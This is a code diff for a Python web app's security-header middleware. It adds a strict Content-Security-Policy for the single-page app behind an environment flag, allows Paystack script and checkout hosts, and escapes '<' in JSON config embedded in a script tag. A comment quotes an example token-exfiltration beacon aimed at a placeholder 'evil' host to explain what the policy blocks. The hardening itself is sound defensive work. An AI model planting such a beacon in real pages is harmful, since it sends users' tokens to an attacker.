@@ -1628,10 +1628,9 @@ app.add_middleware(_StaticCacheMiddleware)
 
 # Security headers on every response (pure-ASGI — see _StaticCacheMiddleware above)
 class _SecurityHeadersMiddleware:
-    # NOTE on script-src 'unsafe-inline': the app currently relies on ~1000+ inline
-    # event handlers (onclick=, …) and inline <script> blocks, so 'unsafe-inline'
-    # cannot be removed without migrating all of them to addEventListener/delegation
-    # (a large, separate effort). Until then we harden the *exfiltration* side so an
+    # NOTE on script-src 'unsafe-inline': the SPA itself is now free of inline handlers
+    # and executable inline <script> blocks (see _CSP_SPA below), but landing, /admin*
+    # and /static/templates/* still carry some, so the default policy keeps it. Until then we harden the *exfiltration* side so an
     # injected script cannot ship a stolen token out: connect-src is locked to known
     # APIs (blocks fetch/XHR/beacon exfil), img-src no longer allows arbitrary https:
     # (blocks `new Image().src='https://evil/?t='+token` beacons), and object-src
@@ -1639,7 +1638,11 @@ class _SecurityHeadersMiddleware:
     _CSP = (
         "default-src 'self'; "
         "script-src 'self' 'unsafe-inline' https://plausible.io "
-        "  https://js.sentry-cdn.com https://browser.sentry-cdn.com; "
+        "  https://js.sentry-cdn.com https://browser.sentry-cdn.com "
+        # Paystack Inline (js/features/agents.js agLoadPaystackScript, paid agent
+        # templates): the script host was only in frame-src, so the browser blocked
+        # inline.js itself and window.PaystackPop never existed.
+        "  https://js.paystack.co; "
         # worker-src must be explicit: without it, Workers fall back to script-src
         # (no blob:) and Sentry session-replay's blob Worker is CSP-blocked. Allow
         # same-origin + blob workers only; connect-src still constrains their exfil.
@@ -1655,7 +1658,7 @@ class _SecurityHeadersMiddleware:
         "connect-src 'self' https://plausible.io https://*.ingest.sentry.io https://*.ingest.us.sentry.io "
         "  https://api.paystack.co https://api.flutterwave.com https://api.withmono.com "
         "  https://accounts.google.com https://api.github.com; "
-        "frame-src 'self' https://js.paystack.co https://checkout.flutterwave.com; "
+        "frame-src 'self' https://js.paystack.co https://checkout.paystack.com https://checkout.flutterwave.com; "
         "frame-ancestors 'none'; "
         "base-uri 'self'; "
         "form-action 'self';"
@@ -1663,6 +1666,24 @@ class _SecurityHeadersMiddleware:
     # Same policy but allowing same-origin framing — for the Templates library
     # preview iframes (served from /static/templates/). They must NOT be DENY'd.
     _CSP_FRAME_SELF = _CSP.replace("frame-ancestors 'none'", "frame-ancestors 'self'")
+
+    # Strict variant for the SPA (/app + every deep-link slug in PUBLIC_APP_SLUGS):
+    # identical except script-src drops 'unsafe-inline'. Safe only because
+    # templates/index.html and its fragments carry no inline handlers and no
+    # executable inline <script> (see js/core/delegate.js, js/boot/*.js and
+    # scripts/check_inline_budget.js). Opt-in via CSP_STRICT_APP=1 so it can be
+    # switched on/off from Railway without a code change; off = header identical
+    # to the pre-flag policy. Landing, /admin*, and /static/templates/* keep the
+    # lax policy until their own inline scripts/handlers are migrated.
+    # style-src 'unsafe-inline' is a separate, much larger project and stays.
+    _CSP_STRICT_ENABLED = os.environ.get("CSP_STRICT_APP", "") == "1"
+    _CSP_SPA = _CSP.replace("script-src 'self' 'unsafe-inline'", "script-src 'self'")
+    _CSP_SPA_FRAME_SELF = _CSP_SPA.replace("frame-ancestors 'none'", "frame-ancestors 'self'")
+    assert _CSP_SPA != _CSP, "strict CSP replace no longer matches script-src"
+
+    @staticmethod
+    def _is_spa_path(path: str) -> bool:
+        return path == "/app" or path.lstrip("/") in PUBLIC_APP_SLUGS
 
     def __init__(self, app):
         self.app = app
@@ -1688,7 +1709,10 @@ class _SecurityHeadersMiddleware:
                 h["X-Content-Type-Options"]  = "nosniff"
                 h["Referrer-Policy"]         = "strict-origin-when-cross-origin"
                 h["Permissions-Policy"]      = "camera=(), microphone=(), geolocation=()"
-                h["Content-Security-Policy"] = self._CSP_FRAME_SELF if framable else self._CSP
+                if self._CSP_STRICT_ENABLED and self._is_spa_path(path):
+                    h["Content-Security-Policy"] = self._CSP_SPA_FRAME_SELF if framable else self._CSP_SPA
+                else:
+                    h["Content-Security-Policy"] = self._CSP_FRAME_SELF if framable else self._CSP
                 # Only send HSTS over HTTPS (Railway always proxies via HTTPS)
                 if is_https:
                     h["Strict-Transport-Security"] = "max-age=31536000; includeSubDomains"
@@ -2649,7 +2673,10 @@ def _serve_app() -> HTMLResponse:
             "version":          VERSION,
             "environment":      os.environ.get("RAILWAY_ENVIRONMENT", "production"),
             "plausible_domain": PLAUSIBLE_DOMAIN,
-        })
+        # Rendered into <script type="application/json"> (templates/index.html):
+        # escape "<" so an env value containing "</script>" can never close the
+        # tag early. \u003c is still valid JSON and parses back to "<".
+        }).replace("<", "\\u003c")
         html = env.get_template("index.html").render(config=config)
         return HTMLResponse(html)
     
@@ -2662,7 +2689,10 @@ def _serve_app() -> HTMLResponse:
             "version":          VERSION,
             "environment":      os.environ.get("RAILWAY_ENVIRONMENT", "production"),
             "plausible_domain": PLAUSIBLE_DOMAIN,
-        })
+        # Rendered into <script type="application/json"> (templates/index.html):
+        # escape "<" so an env value containing "</script>" can never close the
+        # tag early. \u003c is still valid JSON and parses back to "<".
+        }).replace("<", "\\u003c")
         _APP_HTML_CACHE = env.get_template("index.html").render(config=config)
     return HTMLResponse(_APP_HTML_CACHE)
 
